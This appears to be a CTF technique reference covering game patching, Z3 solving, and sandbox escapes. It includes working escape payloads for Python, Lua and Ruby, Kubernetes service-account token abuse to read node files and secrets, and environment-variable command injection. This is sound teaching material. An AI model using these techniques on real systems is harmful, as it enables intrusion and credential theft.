# CTF Misc - Games, VMs & Constraint Solving (Part 1)

## Table of Contents
- [WASM Game Exploitation via Patching](#wasm-game-exploitation-via-patching)
- [Roblox Place File Reversing](#roblox-place-file-reversing)
- [PyInstaller Extraction](#pyinstaller-extraction)
  - [Opcode Remapping](#opcode-remapping)
- [Marshal Code Analysis](#marshal-code-analysis)
  - [Bytecode Inspection Tips](#bytecode-inspection-tips)
- [Python Environment RCE](#python-environment-rce)
- [Z3 Constraint Solving](#z3-constraint-solving)
  - [YARA Rules with Z3](#yara-rules-with-z3)
  - [Type Systems as Constraints](#type-systems-as-constraints)
  - [Z3 SAT Solving for Boolean Logic Gate Networks (BSidesSF 2026)](#z3-sat-solving-for-boolean-logic-gate-networks-bsidessf-2026)
- [Kubernetes RBAC Bypass](#kubernetes-rbac-bypass)
  - [K8s Privilege Escalation Checklist](#k8s-privilege-escalation-checklist)
- [Floating-Point Precision Exploitation](#floating-point-precision-exploitation)
  - [Finding Exploitable Values](#finding-exploitable-values)
  - [Exploitation Strategy](#exploitation-strategy)
  - [Why It Works](#why-it-works)
  - [Red Flags in Challenges](#red-flags-in-challenges)
  - [Quick Test Script](#quick-test-script)
- [Custom Assembly Language Sandbox Escape (EHAX 2026)](#custom-assembly-language-sandbox-escape-ehax-2026)
- [Lua Sandbox Escape via Function Name Injection (CSAW CTF 2016)](#lua-sandbox-escape-via-function-name-injection-csaw-ctf-2016)
- [Ruby Sandbox Escape via TracePoint.trace (HITCON 2017)](#ruby-sandbox-escape-via-tracepointtrace-hitcon-2017)
- [Pixel-Sampling BFS Maze Auto-Solver (HackCon 2018)](#pixel-sampling-bfs-maze-auto-solver-hackcon-2018)
- [References](#references)

---

## WASM Game Exploitation via Patching

**Pattern (Tac Tic Toe, Pragyan 2026):** Game with unbeatable AI in WebAssembly. Proof/verification system validates moves but doesn't check optimality.

**Key insight:** If the proof generation depends only on move positions and seed (not on whether moves were optimal), patching the WASM to make the AI play badly produces a beatable game with valid proofs.

**Patching workflow:**
```bash
# 1. Convert WASM binary to text format
wasm2wat main.wasm -o main.wat

# 2. Find the minimax function (look for bestScore initialization)
# Change initial bestScore from -1000 to 1000
# Flip comparison: i64.lt_s -> i64.gt_s (selects worst moves instead of best)

# 3. Recompile
wat2wasm main.wat -o main_patched.wasm
```

**Exploitation:**
```javascript
const go = new Go();
const result = await WebAssembly.instantiate(
  fs.readFileSync("main_patched.wasm"), go.importObject
);
go.run(result.instance);

InitGame(proof_seed);
// Play winning moves against weakened AI
for (const m of [0, 3, 6]) {
    PlayerMove(m);
}
const data = GetWinData();
// Submit data.moves and data.proof to server -> valid!
```

**General lesson:** In client-side game challenges, always check if the verification/proof system is independent of move quality. If so, patch the game logic rather than trying to beat it.

---

## Roblox Place File Reversing

**Pattern (MazeRunna, 0xFun 2026):** Roblox game where the flag is hidden in an older published version. Latest version contains a decoy flag.

**Step 1: Identify target IDs from game page HTML:**
```python
placeId = 75864087736017
universeId = 8920357208
```

**Step 2: Pull place versions via Roblox Asset Delivery API:**
```bash
# Requires .ROBLOSECURITY cookie (rotate after CTF!)
for v in 1 2 3; do
  curl -H "Cookie: .ROBLOSECURITY=..." \
    "https://assetdelivery.roblox.com/v2/assetId/${PLACE_ID}/version/$v" \
    -o place_v${v}.rbxlbin
done
```

**Step 3: Parse .rbxlbin binary format:**
The Roblox binary place format contains typed chunks:
- **INST** — defines class buckets (Script, Part, etc.) and referent IDs
- **PROP** — per-instance property values (including `Source` for scripts)
- **PRNT** — parent→child relationships forming the object tree

```python
# Pseudocode for extracting scripts
for chunk in parse_chunks(data):
    if chunk.type == 'PROP' and chunk.field == 'Source':
        for referent, source in chunk.entries:
            if source.strip():
                print(f"[{get_path(referent)}] {source}")
```

**Step 4: Diff script sources across versions.**
- v3 (latest): `Workspace/Stand/Color/Script` → fake flag
- v2 (older): same path → real flag

**Key lessons:**
- Always check **version history** — latest version may be a decoy
- Roblox Asset Delivery API exposes all published versions
- Rotate `.ROBLOSECURITY` cookie immediately after use (it's a full session token)

---

## PyInstaller Extraction

```bash
python pyinstxtractor.py packed.exe
# Look in packed.exe_extracted/
```

### Opcode Remapping
If decompiler fails with opcode errors:
1. Find modified `opcode.pyc`
2. Build mapping to original values
3. Patch target .pyc
4. Decompile normally

---

## Marshal Code Analysis

```python
import marshal, dis
with open('file.bin', 'rb') as f:
    code = marshal.load(f)
dis.dis(code)
```

### Bytecode Inspection Tips
- `co_consts` contains literal values (strings, numbers)
- `co_names` contains referenced names (function names, variables)
- `co_code` is the raw bytecode
- Use `dis.Bytecode(code)` for instruction-level iteration

---

## Python Environment RCE

```bash
PYTHONWARNINGS=ignore::antigravity.Foo::0
BROWSER="/bin/sh -c 'cat /flag' %s"
```

**Other dangerous environment variables:**
- `PYTHONSTARTUP` - Script executed on interactive startup
- `PYTHONPATH` - Inject modules via path hijacking
- `PYTHONINSPECT` - Drop to interactive shell after script

**How PYTHONWARNINGS works:** Setting `PYTHONWARNINGS=ignore::antigravity.Foo::0` triggers `import antigravity`, which opens a URL via `$BROWSER`. Control `$BROWSER` to execute arbitrary commands.

---

## Z3 Constraint Solving

```python
from z3 import *

flag = [BitVec(f'f{i}', 8) for i in range(FLAG_LEN)]
s = Solver()
s.add(flag[0] == ord('f'))  # Known prefix
# Add constraints...
if s.check() == sat:
    print(bytes([s.model()[f].as_long() for f in flag]))
```

### YARA Rules with Z3
```python
from z3 import *

flag = [BitVec(f'f{i}', 8) for i in range(FLAG_LEN)]
s = Solver()

# Literal bytes
for i, byte in enumerate([0x66, 0x6C, 0x61, 0x67]):
    s.add(flag[i] == byte)

# Character range
for i in range(4):
    s.add(flag[i] >= ord('A'))
    s.add(flag[i] <= ord('Z'))

if s.check() == sat:
    m = s.model()
    print(bytes([m[f].as_long() for f in flag]))
```

### Type Systems as Constraints
**OCaml GADTs / advanced types encode constraints.**

Don't compile - extract constraints with regex and solve with Z3:
```python
import re
from z3 import *

matches = re.findall(r"\(\s*([^)]+)\s*\)\s*(\w+)_t", source)
# Convert to Z3 constraints and solve
```

### Z3 SAT Solving for Boolean Logic Gate Networks (BSidesSF 2026)

**Pattern (flag-factory-pro):** A "product key" validation system is implemented as a network of 250 boolean logic gates (AND, OR, XOR, NOT) connected by wires. Given 125 boolean input bits and the gate truth values (all gates must output True), find a valid assignment of input bits. This is a classic satisfiability (SAT) problem solvable with Z3.

```python
from z3 import *
import base64

# Parse the gate network from challenge data
data = base64.b64decode(registration_request)
gates = parse_gates(data)  # List of (gate_type, input_wires, output_wire)

# Create 125 boolean variables for input bits
inputs = [Bool(f"x_{i}") for i in range(125)]

# Map wire IDs to Z3 expressions
wires = {i: inputs[i] for i in range(125)}

solver = Solver()
for gate_type, in1, in2, out in gates:
    w1 = wires[in1]
    w2 = wires[in2] if in2 is not None else None

    if gate_type == "AND":
        wires[out] = And(w1, w2)
    elif gate_type == "OR":
        wires[out] = Or(w1, w2)
    elif gate_type == "XOR":
        wires[out] = Xor(w1, w2)
    elif gate_type == "NOT":
        wires[out] = Not(w1)

    # All gate outputs must be True
    solver.add(wires[out] == True)

if solver.check() == sat:
    model = solver.model()
    # Extract 125 bits, encode as base32 in 5-bit groups
    bits = [1 if is_true(model[inputs[i]]) else 0 for i in range(125)]
    # Convert to product key format
    key = bits_to_base32(bits)
    print(f"Product key: {key}")
```

**Key insight:** Boolean logic gate networks are directly expressible as Z3 constraints. Each gate becomes one constraint (`And`, `Or`, `Xor`, `Not`), and the requirement that all outputs are True constrains the solution space. Even with 125 input variables and 250 gates, Z3 solves this in milliseconds. Any "keygen" or "product key" challenge with observable validation logic can be modeled this way.

**When to recognize:** Challenge involves product key validation, license key generation, circuit/gate diagrams, or registration code verification. If the validation logic is extractable (from binary, network capture, or provided spec), model it as a SAT/SMT problem. Z3 handles boolean, bitvector, integer, and real arithmetic constraints.

**References:** BSidesSF 2026 "flag-factory-pro"

---

## Kubernetes RBAC Bypass

**Pattern (CTFaaS, LACTF 2026):** Container deployer with claimed ServiceAccount isolation.

**Attack chain:**
1. Deploy probe container that reads in-pod ServiceAccount token at `/var/run/secrets/kubernetes.io/serviceaccount/token`
2. Verify token can impersonate deployer SA (common misconfiguration)
3. Create pod with `hostPath` volume mounting `/` -> read node filesystem
4. Extract kubeconfig (e.g., `/etc/rancher/k3s/k3s.yaml`)
5. Use node credentials to access hidden namespaces and read secrets

```bash
# From inside pod:
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
curl -k -H "Authorization: Bearer $TOKEN" \
  https://kubernetes.default.svc/api/v1/namespaces/hidden/secrets/flag
```

### K8s Privilege Escalation Checklist
- Check RBAC: `kubectl auth can-i --list`
- Look for pod creation permissions (can create privileged pods)
- Check for hostPath volume mounts allowed in PSP/PSA
- Look for secrets in environment variables of other pods
- Check for service mesh sidecars leaking credentials

---

## Floating-Point Precision Exploitation

**Pattern (Spare Me Some Change):** Trading/economy games where large multipliers amplify tiny floating-point errors.

**Key insight:** When decimal values (0.01-0.99) are multiplied by large numbers (e.g., 1e15), floating-point representation errors create fractional remainders that can be exploited.

### Finding Exploitable Values
```python
mult = 1000000000000000  # 10^15

# Find values where multiplication creates useful fractional errors
for i in range(1, 100):
    x = i / 100.0
    result = x * mult
    frac = result - int(result)
    if frac > 0:
        print(f'x={x}: {result} (fraction={frac})')

# Common values with positive fractions:
# 0.07 -> 70000000000000.0078125
# 0.14 -> 140000000000000.015625
# 0.27 -> 270000000000000.03125
# 0.56 -> 560000000000000.0625
```

### Exploitation Strategy
1. **Identify the constraint**: Need `balance >= price` AND `inventory >= fee`
2. **Find favorable FP error**: Value where `x * mult` has positive fraction
3. **Key trick**: Sell the INTEGER part of inventory, keeping the fractional "free money"

**Example (time-travel trading game):**
```text
Initial: balance=5.00, inventory=0.00, flag_price=5.00, fee=0.05
Multiplier: 1e15 (time travel)

# Buy 0.56, travel through time:
balance = (5.0 - 0.56) * 1e15 = 4439999999999999.5
inventory = 0.56 * 1e15 = 560000000000000.0625

# Sell exactly 560000000000000 (integer part):
balance = 4439999999999999.5 + 560000000000000 = 5000000000000000.0 (FP rounds!)
inventory = 560000000000000.0625 - 560000000000000 = 0.0625 > 0.05 fee

# Now: balance >= flag_price AND inventory >= fee
```

### Why It Works
- Float64 has ~15-16 significant digits precision
- `(5.0 - 0.56) * 1e15` loses precision -> rounds to exact 5e15 when added
- `0.56 * 1e15` keeps the 0.0625 fraction as "free inventory"
- The asymmetric rounding gives you slightly more total value than you started with

### Red Flags in Challenges
- "Time travel amplifies everything" (large multipliers)
- Trading games with buy/sell + special actions
- Decimal currency with fees or thresholds
- "No decimals allowed" after certain operations (forces integer transactions)
- Starting values that seem impossible to win with normal math

### Quick Test Script
```python
def find_exploit(mult, balance_needed, inventory_needed):
    """Find x where selling int(x*mult) gives balance>=needed with inv>=needed"""
    for i in range(1, 500):
        x = i / 100.0
        if x >= 5.0:  # Can't buy more than balance
            break
        inv_after = x * mult
        bal_after = (5.0 - x) * mult

        # Sell integer part of inventory
        sell = int(inv_after)
        final_bal = bal_after + sell
        final_inv = inv_after - sell

        if final_bal >= balance_needed and final_inv >= inventory_needed:
            print(f'EXPLOIT: buy {x}, sell {sell}')
            print(f'  final_balance={final_bal}, final_inventory={final_inv}')
            return x
    return None

# Example usage:
find_exploit(1e15, 5e15, 0.05)  # Returns 0.56
```

---

## Custom Assembly Language Sandbox Escape (EHAX 2026)

**Pattern (Chusembly):** Web app with custom instruction set (LD, PUSH, PROP, CALL, IDX, etc.) running on a Python backend. Safety check only blocks the word "flag" in source code.

**Key insight:** `PROP` (property access) and `CALL` (function invocation) instructions allow traversing Python's MRO chain from any object to achieve RCE, similar to Jinja2 SSTI.

**Exploit chain:**
```text
LD 0x48656c6c6f A     # Load "Hello" string into register A
PROP __class__ A      # str → <class 'str'>
PROP __base__ E       # str → <class 'object'> (E = result register)
PROP __subclasses__ E # object → bound method
CALL E                # object.__subclasses__() → list of all classes
# Find os._wrap_close at index 138 (varies by Python version)
IDX 138 E             # subclasses[138] = os._wrap_close
PROP __init__ E       # get __init__ method
PROP __globals__ E    # access function globals
# Use __getitem__ to access builtins without triggering keyword filter
PUSH 0x5f5f6275696c74696e735f5f  # "__builtins__" as hex
CALL __getitem__ E               # globals["__builtins__"]
# Bypass "flag" keyword filter with hex encoding
PUSH 0x666c61672e747874          # "flag.txt" as hex
CALL open E                      # open("flag.txt")
CALL read E                      # read file contents
STDOUT E                         # print flag
```

**Filter bypass techniques:**
- **Hex-encoded strings:** `0x666c61672e747874` → `"flag.txt"` bypasses keyword filters
- **os.popen for shell:** If file path is unknown, use `os.popen('ls /').read()` then `os.popen('cat /flag*').read()`
- **Subclass index discovery:** Iterate through `__subclasses__()` list to find useful classes (os._wrap_close, subprocess.Popen, etc.)

**General approach for custom language challenges:**
1. **Read the docs:** Check `/docs`, `/help`, `/api` endpoints for instruction reference
2. **Find the result register:** Many custom languages have a special register for return values
3. **Test string handling:** Try hex-encoded strings to bypass keyword filters
4. **Chain Python MRO:** Any Python string object → `__class__.__base__.__subclasses__()` → RCE
5. **Error messages leak info:** Intentional errors reveal Python internals and available classes

---

## Lua Sandbox Escape via Function Name Injection (CSAW CTF 2016)

Lua sandboxes that filter `load()` and `os.execute()` by name can be bypassed if function references exist in other accessible tables or through string concatenation of function names.

```lua
-- Common Lua sandbox restrictions:
-- os.execute blocked, load blocked, require blocked

-- Bypass 1: If string.find is available, use it to test for allowed functions
-- then access via table indexing
local f = os["execute"]  -- table index bypass if only os.execute() call is blocked
f("cat /flag")

-- Bypass 2: Use loadstring (alias for load in Lua 5.1)
loadstring("os.execute('cat /flag')")()

-- Bypass 3: Via debug library (if available)
debug.getregistry()  -- access internal Lua registry

-- Bypass 4: Bytecode execution (compile outside, load bytecode)
-- Compile payload: luac -o payload.luac payload.lua
-- Load bytecode in sandbox (may bypass source-level filters)

-- Bypass 5: Concatenation to build function names
local cmd = "exe" .. "cute"
os[cmd]("cat /flag")

-- Bypass 6: Via io library
io.popen("cat /flag"):read("*a")
```

**Key insight:** Lua sandboxes typically filter specific function *calls* but not *table lookups*. Access blocked functions through table indexing (`os["execute"]`), string concatenation for function names, or alternate I/O libraries (`io.popen`). Also check if `loadstring` (Lua 5.1 alias for `load`) is unblocked.

---

## Ruby Sandbox Escape via TracePoint.trace (HITCON 2017)

**Pattern:** Ruby sandbox uses `set_trace_func` to monitor execution and block dangerous calls. Bypass: register a `TracePoint` hook for `:c_call` events. TracePoint fires at the C-extension level, before Ruby-level `set_trace_func` hooks activate.

```ruby
TracePoint.trace(:c_call) do |tp|
  system('sh')
end
```

The hook fires on the next C-level call (e.g., `puts`, any method call), executing `system('sh')` before the sandbox monitor can intercept it.

**Why it works:** `TracePoint` (introduced in Ruby 2.0) operates at a lower level than `set_trace_func`. `:c_call` hooks fire when any C-implemented method is invoked, which happens before the Ruby event system that `set_trace_func` relies on processes the event.

**Key insight:** `TracePoint` operates at a lower level than `set_trace_func` in Ruby — C-call hooks fire before Ruby-level event hooks, allowing sandbox escape. Any subsequent C-method call (even benign ones) triggers the payload.

---

## Pixel-Sampling BFS Maze Auto-Solver (HackCon 2018)

**Pattern:** Challenge streams a PNG of a grid maze and expects the player to type WASD moves within a tight time limit. Manual solving is impossible at scale, but the maze is a uniform grid — each cell is exactly `N` pixels wide and each wall is 1 cell wide.

**Solver pipeline:**
```python
import requests, numpy as np
from collections import deque
from PIL import Image
from io import BytesIO

CELL = 10  # measured cell width in pixels

def fetch_grid(url):
    img = np.array(Image.open(BytesIO(requests.get(url).content)).convert('L'))
    rows, cols = img.shape[0] // CELL, img.shape[1] // CELL
    # 1 = wall (dark pixel at cell center), 0 = open
    grid = [[1 if img[r*CELL + CELL//2, c*CELL + CELL//2] < 128 else 0
             for c in range(cols)] for r in range(rows)]
    return grid

def bfs(grid, start, goal):
    dirs = [(-1, 0, 'W'), (1, 0, 'S'), (0, -1, 'A'), (0, 1, 'D')]
    q = deque([(start, '')])
    seen = {start}
    while q:
        (r, c), path = q.popleft()
        if (r, c) == goal:
            return path
        for dr, dc, m in dirs:
            nr, nc = r + dr, c + dc
            if (0 <= nr < len(grid) and 0 <= nc < len(grid[0])
                    and grid[nr][nc] == 0 and (nr, nc) not in seen):
                seen.add((nr, nc))
                q.append(((nr, nc), path + m))
```

Measure `CELL` once by inspecting the first row of the image; then every maze in the same challenge series decodes to a boolean grid and BFS yields the move sequence in milliseconds.

**Key insight:** Any image-driven CTF game can be turned into a graph problem by sampling one pixel per logical cell — pick the cell center, not the border, so wall thickness doesn't poison the result. Build the grid, BFS, and output the move string. The same pattern works for color-coded mazes (`img[r*CELL+CELL//2, c*CELL+CELL//2]` with RGB comparison) and for 3D isometric grids after an affine rectification.

**References:** HackCon 2018 — writeup 10764

---

## References
- Pragyan 2026 "Tac Tic Toe": WASM minimax patching
- LACTF 2026 "CTFaaS": K8s RBAC bypass via hostPath
- 0xL4ugh CTF: PyInstaller + opcode remapping
- 0xFun 2026 "MazeRunna": Roblox version history + binary place file parsing
- EHAX 2026 "Chusembly": Custom assembly language with Python MRO chain RCE
- HITCON 2017: Ruby TracePoint sandbox escape

---

See also: [games-and-vms-2.md](games-and-vms-2.md) for cookie checkpoint brute-forcing, Flask cookie game state leakage, WebSocket game manipulation, server time-only validation bypass, De Bruijn sequences, Brainfuck instrumentation, and WASM memory manipulation.

See also: [games-and-vms-3.md](games-and-vms-3.md) for memfd_create packed binaries, multi-phase crypto games with HMAC commitment-reveal and GF(256) Nim, emulator ROM-switching state preservation, Python marshal code injection, Benford's Law bypass, parallel connection oracle relay, nonogram solver pipelines, 100 prisoners problem, C code jail escape via emoji identifiers, and BuildKit daemon build secret exploitation.
